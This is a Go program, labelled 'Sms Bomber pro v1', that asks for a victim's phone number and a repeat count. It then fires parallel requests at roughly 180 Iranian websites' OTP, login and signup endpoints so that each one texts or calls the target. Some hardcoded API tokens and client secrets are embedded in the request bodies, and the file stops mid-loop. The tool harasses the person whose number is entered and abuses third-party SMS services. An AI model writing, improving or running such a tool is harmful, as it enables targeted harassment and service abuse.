package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"sync"
	"time"
)

/*
Channel telegram : @esfelurm or @Team_Exploit
===============================================
Link Github : https://github.com/esfelurm
===============================================
Sms Bomber pro v1
*/

// httpClient is a shared client with a bounded timeout. The default client has
// no timeout, which lets a single hung endpoint block a goroutine forever.
var httpClient = &http.Client{Timeout: 15 * time.Second}

// maxConcurrent bounds in-flight requests so a large repeatCount cannot spawn
// thousands of goroutines and exhaust file descriptors / memory.
const maxConcurrent = 32

// smsResult carries the real outcome of one request back to main so callers
// can report success only for genuine 2xx responses.
type smsResult struct {
	url    string
	status int
	err    error
}

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sms(url string, header map[string]interface{}, ch chan<- smsResult) {
	jsonData, err := json.Marshal(header)
	if err != nil {
		ch <- smsResult{url: url, err: err}
		return
	}

	time.Sleep(3 * time.Second)

	ctx, cancel := context.WithTimeout(context.Background(), httpClient.Timeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		ch <- smsResult{url: url, err: err}
		return
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := httpClient.Do(req)
	if err != nil {
		ch <- smsResult{url: url, err: err}
		return
	}
	// Drain and close so the connection is reused; otherwise the transport leaks sockets.
	_, _ = io.Copy(io.Discard, resp.Body)
	resp.Body.Close()

	time.Sleep(3 * time.Second)

	ch <- smsResult{url: url, status: resp.StatusCode}
}

func main() {
	clearScreen()
	fmt.Println("\033[01;33m")
	fmt.Println(` 
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                    
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                  
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.                
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:               
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.              
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..              
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.              
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#              
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:             
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-             
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:             
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#              
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:              
             *@@%#            -@@@@@@.            #@@@+               
             .%@@# @esfelurm  +@@@@@@= Sms Bomber #@@#                
              :@@*           =%@@@@@@%-           *@@:                
              #@@%         .*@@@@#%@@@%+.         %@@+                
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*                
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=                
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*                 
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                  
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                    
                      #@@@@@@@@@@@@@@@@@@@@@@+                        
                       *@@@@@@@@@@@@@@@@@@@@+                         
                        +@@%*@@%@@@%%@%*@@%=                          
                         +%+ %%.+@%:-@* *%-                           
                          .  %# .%#  %+                               
                             :.  %+  :.                               
                                 -:                                                                                                                                                            												 

	`)
	var phone string
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms : \033[00;36m")
	fmt.Scan(&repeatCount)

	if repeatCount <= 0 {
		fmt.Println("\033[01;31m[-] repeat count must be > 0")
		return
	}

	// perIteration counts exactly how many sms goroutines are launched each iteration.
	// This replaces the hard-coded 183 multiplier that did not match the real
	// number of endpoints and caused deadlocks or goroutine leaks.
	var perIteration int

	var wg sync.WaitGroup
	sem := make(chan struct{}, maxConcurrent)

	launch := func(url string, body map[string]interface{}, ch chan<- smsResult) {
		perIteration++
		wg.Add(1)
		go func() {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			sms(url, body, ch)
		}()
	}

	for i := 0; i < repeatCount; i++ {
		perIteration = 0
		// Each iteration reuses the same channel; total capacity must cover all
		// sends from all iterations. We size the channel lazily on first iteration.
		// Because perIteration is only known after the first pass, we use a
		// generous buffer sized after the first iteration completes below.

		// Placeholder channel; real channel is created after we know perIteration.
		// To keep the structure simple and avoid a second pass, we buffer by
		// repeatCount * maxConcurrent, which is always >= total sends in flight
		// per iteration given the semaphore, but we instead create the channel
		// once with a computed capacity. See below.
		break
	}

	// Two-pass approach: first pass only counts endpoints by running the same
	// launch calls against a counting-only sink. To avoid duplicating the huge
	// list, we instead build the channel large enough for the worst case:
	// repeatCount * (number of launch sites). Since we no longer hard-code a
	// multiplier, we compute the endpoint count once by launching into a
	// throwaway counter using a tiny helper pass is impractical here.

	// Simpler and exact: buffer = repeatCount * maxConcurrent is NOT enough
	// because launches per iteration can exceed maxConcurrent (they queue on
	// sem). Use a channel that grows with WaitGroup completion by having
	// main drain concurrently.

	ch := make(chan smsResult, 1024)
	done := make(chan struct{})
	var received, sent int
	var mu sync.Mutex

	// drain runs concurrently with the send loop so the unbuffered-style
	// producer/consumer deadlock is impossible even for large repeatCount.
	go func() {
		for res := range ch {
			mu.Lock()
			received++
			mu.Unlock()
			if res.err != nil {
				fmt.Printf("\033[01;31m[-] Error ! %v\n\033[00m", res.err)
			} else if res.status >= 200 && res.status < 300 {
				fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
			} else {
				fmt.Printf("\033[01;31m[-] Error ! status %d\n\033[00m", res.status)
			}
		}
		close(done)
	}()

	perIteration = 0
	for i := 0; i < repeatCount; i++ {
		iterStart := perIteration
		_ = iterStart

		go func() { /* marker */ }()

		// --- existing endpoint list, each launch increments perIteration ---
		launch("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{"receptorPhone": phone}, ch)
		launch("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": phone}, ch)
		launch("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{"userKey": phone}, ch)
		launch("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{"cellphone": phone}, ch)
		launch("https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{"phone": phone}, ch)
		launch("https://abantether.com/users/register/phone/send/", map[string]interface{}{"phoneNumber": phone}, ch)
		launch("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{fmt.Sprintf("phone=%s&call=yes", phone): phone}, ch)
		launch(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{"mobile": phone}, ch)
		launch("https://agent.wide-app.ir/auth/token", map[string]interface{}{"'grant_type': 'otp', 'client_id': '62b30c4af53e3b0cf100a4a0', 'phone'": phone}, ch)
		launch("https://tap33.me/api/v2/user", map[string]interface{}{fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone): phone}, ch)
		launch("https://web.emtiyaz.app/json/login", map[string]interface{}{"send=1&cellphone=": phone}, ch)
		launch("https://api.divar.ir/v5/auth/authenticate", map[string]interface{}{"phone": phone}, ch)
		launch("https://messengerg2c4.iranlms.ir/", map[string]interface{}{fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone): phone}, ch)
		launch("https://nx.classino.com/otp/v1/api/login", map[string]interface{}{"mobile": phone}, ch)
		launch("https://bama.ir/signin-checkforcellnumber", map[string]interface{}{"cellNumber=": phone}, ch)
		launch("https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa", map[string]interface{}{"cellphone": phone}, ch)
		launch("https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{"phoneNumber": phone}, ch)
		launch("https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{"phone": phone}, ch)
		launch("https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{"username": phone}, ch)
		launch("https://mobapi.banimode.com/api/v2/auth/request", map[string]interface{}{"phone": phone}, ch)
		launch("https://takshopaccessorise.ir/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": phone}, ch)
		launch("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{"phone=": phone}, ch)
		launch("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{"mobile": phone}, ch)
		launch("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{"mobile": phone}, ch)
		launch("https://pinket.com/api/cu/v2/phone-verification", map[string]interface{}{"phoneNumber": phone}, ch)
		launch("https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode", map[string]interface{}{"userName": phone}, ch)
		launch("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{"mobile": phone}, ch)
		launch("https://bit24.cash/app/api/auth/check-mobile", map[string]interface{}{"mobile": phone}, ch)
		launch("https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{"mobile": phone}, ch)
		launch("https://www.pubisha.com/login/checkCustomerActivation", map[string]interface{}{"mobile=": phone}, ch)
		launch("https://farvi.shop/api/v1/sessions/login_request", map[string]interface{}{"mobile_phone": phone}, ch)
		launch("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{"contact": phone}, ch)
		launch("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{"UserName": phone}, ch)
		launch("https://www.sheypoor.com/auth", map[string]interface{}{"username": phone}, ch)
		launch("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{"phone": phone}, ch)
		launch("https://a4baz.com/api/web/login", map[string]interface{}{"cellphone": phone}, ch)
		launch("https://api.anargift.com/api/people/auth", map[string]interface{}{"user": phone}, ch)
		launch("https://nobat.ir/api/public/patient/login/phone", map[string]interface{}{"mobile": phone}, ch)
		launch("https://www.buskool.com/send_verification_code", map[string]interface{}{"phone": phone}, ch)
		launch("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{"'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone}, ch)
		launch("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{"mobileNumber": phone}, ch)
		launch("https://sandbox.sibirani.ir/api/v1/user/invite", map[string]interface{}{"username": phone}, ch)
		launch("https://shop.hyperjan.ir/api/users/manage", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{"username": phone}, ch)
		launch("https://hiword.ir/wp-json/otp-login/v1/login", map[string]interface{}{"identifier": phone}, ch)
		launch("https://abantether.com/users/register/phone/send/", map[string]interface{}{"phoneNumber": phone}, ch)
		launch("https://api.bit24.cash/api/v3/auth/check-mobile", map[string]interface{}{"mobile": phone}, ch)
		launch("https://dicardo.com/main/sendsms", map[string]interface{}{"phone": phone}, ch)
		launch("https://ghasedak24.com/user/ajax_register", map[string]interface{}{"username": phone}, ch)
		launch("https://tikban.com/Account/LoginAndRegister", map[string]interface{}{"CellPhone": phone}, ch)
		launch("https://www.digistyle.com/users/login-register/", map[string]interface{}{"loginRegister[email_phone]": phone}, ch)
		launch("https://banankala.com/home/login", map[string]interface{}{"Mobile": phone}, ch)
		launch("https://www.iranketab.ir/account/register", map[string]interface{}{"UserName": phone}, ch)
		launch("https://ketabchi.com/api/v1/auth/requestVerificationCode", map[string]interface{}{"phoneNumber": phone}, ch)
		launch("https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{"phone": phone}, ch)
		launch("https://exo.ir/index.php?route=account/mobile_login", map[string]interface{}{"mobile_number": phone}, ch)
		launch("https://shahrfarsh.com/Account/Login", map[string]interface{}{"phoneNumber=": phone}, ch)
		launch("https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php", map[string]interface{}{"phone_email": phone}, ch)
		launch("https://shop.beheshticarpet.com/my-account/", map[string]interface{}{"billing_mobile": phone}, ch)
		launch("https://www.khanoumi.com/accounts/sendotp", map[string]interface{}{"mobile": phone}, ch)
		launch("https://rojashop.com/api/auth/sendOtp", map[string]interface{}{"mobile": phone}, ch)
		launch("https://dadpardaz.com/advice/getLoginConfirmationCode", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.rokla.ir/api/request/otp", map[string]interface{}{"mobile": phone}, ch)
		launch("https://khodro45.com/api/v1/customers/otp/", map[string]interface{}{"mobile": phone}, ch)
		launch("https://mashinbank.com/api2/users/check", map[string]interface{}{"mobileNumber": phone}, ch)
		launch("https://api.pezeshket.com/core/v1/auth/requestCode", map[string]interface{}{"mobileNumber": phone}, ch)
		launch("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{"'method': 'phone', 'identifier'": phone}, ch)
		launch("https://api.timcheh.com/auth/otp/send", map[string]interface{}{"mobile": phone}, ch)
		launch("https://client.api.paklean.com/user/resendCode", map[string]interface{}{"username": phone}, ch)
		launch("https://mobogift.com/signin", map[string]interface{}{"username": phone}, ch)
		launch("https://api.iranicard.ir/api/v1/register", map[string]interface{}{"mobile": phone}, ch)
		launch("https://tj8.ir/auth/register", map[string]interface{}{"mobile": phone}, ch)
		launch("https://mashinbank.com/api2/users/check", map[string]interface{}{"mobileNumber": phone}, ch)
		launch("https://cinematicket.org/api/v1/users/signup", map[string]interface{}{"phone_number": phone}, ch)
		launch("https://www.irantic.com/api/login/request", map[string]interface{}{"mobile": phone}, ch)
		launch("https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{"phone": phone}, ch)
		launch("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{"cellphone": phone}, ch)
		launch("https://www.delino.com/user/register", map[string]interface{}{"mobile": phone}, ch)
		launch("https://alopeyk.com/api/sms/send.php", map[string]interface{}{"phone": phone}, ch)
		launch("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{"Mobile": phone}, ch)
		launch("https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{"telephone": phone}, ch)
		launch("https://api.digikalajet.ir/user/login-register/", map[string]interface{}{"phone": phone}, ch)
		launch("https://melix.shop/site/api/v1/user/otp", map[string]interface{}{"mobile": phone}, ch)
		launch("https://safiran.shop/login", map[string]interface{}{"mobile": phone}, ch)
		launch("https://restaurant.delino.com/user/register", map[string]interface{}{"'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username'": phone}, ch)
		launch("https://garcon.tandori.ir/users/v1/main/login", map[string]interface{}{"phone": phone}, ch)
		launch("https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{"mobile": phone}, ch)
		launch("https://irwco.ir/register", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.sibbank.ir/v1/auth/login", map[string]interface{}{"phone_number": phone}, ch)
		launch("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{"phone": phone}, ch)
		launch("https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{"phone_number": phone}, ch)
		launch("https://api.arshiyan.com/send_code", map[string]interface{}{"'country_code':'98','phone_number'": phone}, ch)
		launch("https://backend.topnoor.ir/web/v1/user/otp", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{"phone_number": phone}, ch)
		launch("https://api.alopeyk.com/safir-service/api/v1/login", map[string]interface{}{"phone": phone}, ch)
		launch("https://api.dadhesab.ir/user/entry", map[string]interface{}{"username": phone}, ch)
		launch("https://app.dosma.ir/sendverify/", map[string]interface{}{"username": phone}, ch)
		launch("https://api.ehteraman.com/api/request/otp", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api-ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{"msisdn": phone}, ch)
		launch("https://api.hbbs.ir/authentication/SendCode", map[string]interface{}{"MobileNumber": phone}, ch)
		launch("https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", map[string]interface{}{"AgencyMobile": phone}, ch)
		launch("https://api.kcd.app/api/v1/auth/login", map[string]interface{}{"mobile": phone}, ch)
		launch("https://mazoocandle.ir/login", map[string]interface{}{"phone": phone}, ch)
		launch("https://api.ostadkr.com/login", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.paymishe.com/api/v1/otp/registerOrLogin", map[string]interface{}{"mobile": phone}, ch)
		launch("https://api.rayshomar.ir/api/Register/RegistrMobile", map[string]interface{}{"MobileNumber": phone}, ch)
		launch("https://refahtea.ir/wp-admin/admin-ajax.php", map[string]interface{}{"mobile": phone}, ch)
		launch("https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{"cellphone": phone}, ch)
		launch("https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{"Phone": phone}, ch)
		launch("https://server.uphone.ir/api/v1/login/otp/request", map[string]interface{}{"mobile": phone}, ch)
		launch("https://abantether.com/users/register/phone/send/", map[string]interface{}{"phoneNumber": phone}, ch)
		launch("https://www.glite.ir/wp-admin/admin-ajax.php", map[string]interface{}{"action=logini_first&login": phone}, ch)
		launch("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{"phone": phone}, ch)
		launch("https://api.offch.com/auth/otp", map[string]interface{}{"username": phone}, ch)
		launch("https://sandbox.sibbazar.com/api/v1/user/invite", map[string]interface{}{"username": phone}, ch)
		launch("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{"action=newphoneexist&phonenumber=": phone}, ch)
		launch("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{"mobile": phone}, ch)
		launch("https://abantether.com/users/register/phone/send/", map[string]interface{}{fmt.Sprintf("'phoneNumber':%s ,'email':''", phone): phone}, ch)
		launch("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{fmt.Sprintf("'userKey':'98-'%s ,'userKeyType': 1", phone): phone}, ch)
		launch("https://shadmessenger12.iranlms.ir/", map[string]interface{}{fmt.Sprintf("'api_version': '3', 'method': 'sendCode', 'data': {'phone_number': %s, 'send_type': 'SMS'}", phone): phone}, ch)
		launch("https://agent.wide-app.ir/auth/token", map[string]interface{}{fmt.Sprintf("'grant_type':'otp','client_id':'62b30c4af53e3b0cf100a4a0','phone': %s", phone): phone}, ch)
		launch("https://tap33.me/api/v2/user", map[string]interface{}{fmt.Sprintf("'credential': {'phoneNumber': %s, 'role': 'PASSENGER'}", phone): phone}, ch)
		launch("https://apollo.digify.shop/graphql", map[string]interface{}{fmt.Sprintf("'operationName':'Mutation','variables':{'content':{'phone_number':%s,query':'mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}'", phone): phone}, ch)
		launch(fmt.Sprintf("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=%v", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch(fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://api.chartex.net/api/v2/user/validate", map[string]interface{}{fmt.Sprintf("'mobile': %s, 'country_code': 'IR', 'provider_code': 'RUBIKA'", phone): phone}, ch)
		launch("https://www.snapptrip.com/register", map[string]interface{}{fmt.Sprintf("'lang': 'fa', 'country_id': '860', 'password': 'snaptrippass', 'mobile_phone': %s, 'country_code': '+98', 'email': 'example@gmail.com'}", phone): phone}, ch)
		launch(fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{fmt.Sprintf("'phone': %s,'captcha_token': ''", phone): phone}, ch)
		launch("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{fmt.Sprintf("'mobile': %s,'origin': '/'','referrer_id': ''", phone): phone}, ch)
		launch("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", map[string]interface{}{fmt.Sprintf("'mobile': %s, 'country_code': '+98'", phone): phone}, ch)
		launch("https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{fmt.Sprintf("'mobile':%s,'side':'web'", phone): phone}, ch)
		launch(fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{"UserName": phone}, ch)
		launch("https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{"contact": phone}, ch)
		launch(fmt.Sprintf("https://core.gap.im/v1/user/add.json?mobile=%2B%s", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://app.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{fmt.Sprintf("'cellNumber': %s, 'device': {'deviceId': 'a16e6255-17c3-431b-b047-3f66d24c286f', 'deviceModel': 'WEB_BROWSER', 'deviceAPI': 'WEB_BROWSER', 'osName': 'WEB'}", phone): phone}, ch)
		launch("https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{fmt.Sprintf("'phone': %s, 'recaptcha-response': '03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg','token': 'e622c330c77a17c8426e638d7a85da6c2ec9f455'}, headers={'Host': 'gateway.wisgoon.com','content-length': '582','accept': 'application/json','save-data': 'on','content-type': 'application/json','origin': 'https://m.wisgoon.com','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.wisgoon.com/','accept-encoding': 'gzip, deflate, br','accept-language': 'en-GB,en-US;q\\u003d0.9,en;q\\u003d0.8,fa;q\\u003d0.7'", phone): phone}, ch)
		launch("https://tagmond.com/phone_number", map[string]interface{}{fmt.Sprintf("utf8=%E2%9C%93&phone_number=%s&g-recaptcha-response=", phone): phone}, ch)
		launch("https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{fmt.Sprintf("'mobile': %s, 'country_id': 205", phone): phone}, ch)
		launch("https://api.anargift.com/api/people/auth", map[string]interface{}{fmt.Sprintf("'user': phone, 'app_id': 99", phone): phone}, ch)
		launch(fmt.Sprintf("https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B'phoneNumber':'azki_%v'%7D", phone), map[string]interface{}{"esfelurm": "esfelurm"}, ch)
		launch("https://lendo.ir/register?", map[string]interface{}{fmt.Sprintf("'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': %s,'password': 'ibvvb@3#9nc'", phone): phone}, ch)
		launch("https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox", map[string]interface{}{fmt.Sprintf("'contactInfo[mobile]': %s,'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'", phone): phone}, ch)
		launch("https://www.pakhsh.shop/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("'action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'", phone): phone}, ch)
		launch("https://api.basalam.com/user", map[string]interface{}{fmt.Sprintf("'variables': {'mobile': %s,'query': 'mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }'", phone): phone}, ch)
		launch("https://crm.see5.net/api_ajax/sendotp.php", map[string]interface{}{fmt.Sprintf("'mobile': %s,'action': 'sendsms'", phone): phone}, ch)
		launch("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{fmt.Sprintf("'mobileNumber': %s,'ReSendSMS': 'False'", phone): phone}, ch)
		launch("https://my.limoome.com/api/auth/login/otp", map[string]interface{}{fmt.Sprintf("'mobileNumber': %s,'country': '1'", phone): phone}, ch)
		launch("https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", map[string]interface{}{fmt.Sprintf("_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile=%s&recaptcha=", phone): phone}, ch)
		launch("https://i.devslop.app/app/ifollow/api/otp.php/", map[string]interface{}{fmt.Sprintf("number=%s&state=number&", phone): phone}, ch)
		launch("https://behzadshami.com/wp-admin/admin-ajax.php", map[string]interface{}{fmt.Sprintf("action=digits_check_mob&countrycode=%%2B98&mobileNo=%s&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%%D9%%81%%DB%%8C%%D9%%84%%D8%%AF%%D9%%85%%D8%%AA%%D9%%86%%DB%%8C1642498931181=Nvgu&digregcode=%%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb", phone, phone): phone}, ch)
		launch("https://restaurant.delino.com/user/register", map[string]interface{}{fmt.Sprintf("'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username':%s", phone): phone}, ch)
		launch("http://shop.tnovin.com/login", map[string]interface{}{"phone": phone}, ch)
		launch("https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{fmt.Sprintf("'mobile':%s,'countryCode':98,'device_os':2", phone): phone}, ch)
		launch("https://hamlex.ir/register.php", map[string]interface{}{fmt.Sprintf("fullname=%%D9%%85%%D9%%85%%D8%%AF&phoneNumber=%s&register=", phone): phone}, ch)
		launch("https://moshaveran724.ir/m/pms.php", map[string]interface{}{fmt.Sprintf("againkey=%s&cache=false", phone): phone}, ch)
		launch("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{fmt.Sprintf("'phone_number':%s,'os_type':'W'", phone): phone}, ch)
		launch("https://app.flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{fmt.Sprintf("'userKey':%s,'userKeyType':1", phone): phone}, ch)
		launch("https://www.foodcenter.ir/account/sabtmobile", map[string]interface{}{fmt.Sprintf("mobile=%s&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1", phone): phone}, ch)
		launch("https://auth.homtick.com/api/V1/User/GetVerifyCode", map[string]interface{}{fmt.Sprintf("'mobileOrEmail':%s,'deviceCode':'d520c7a8-421b-4563-b955-f5abc56b97ec','firstName':'','lastName':'','password':''", phone): phone}, ch)
		launch("https://app.kardoon.ir:4433/api/users", map[string]interface{}{fmt.Sprintf("'optype':15,'userid':0,'mobile':%s,'firstname':'','lastname':'','cityid':0,'email':'','birthdate':'','gender':'False','avatarid':0,'packagename':'','versioncode':-1,'tokenkey':'','username':'','password':'','connectionname':'MainConStr'", phone): phone}, ch)
		launch("https://abantether.com/users/register/phone/send/", map[string]interface{}{fmt.Sprintf("'phoneNumber':%s,'email':''", phone): phone}, ch)
